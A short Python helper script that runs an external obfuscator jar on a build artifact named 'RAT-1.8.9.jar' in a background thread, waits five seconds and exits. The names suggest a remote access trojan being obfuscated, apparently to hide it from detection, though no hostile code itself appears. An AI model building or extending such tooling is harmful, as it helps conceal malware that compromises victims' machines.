import os
import time
import threading
import sys

cwd = os.getcwd()

def obfuscate():
    jar_path = f"{cwd}/rat/build/libs/RAT-1.8.9.jar"
    obf_path = f"{cwd}/obf/obf.jar"
    cmd = f'java -jar "{obf_path}" "{jar_path}"'
    os.system(f"{cmd}")

def obftimeout():
    time.sleep(5)


thread = threading.Thread(target=obfuscate)
thread.daemon = True
thread.start()
obftimeout()
quit()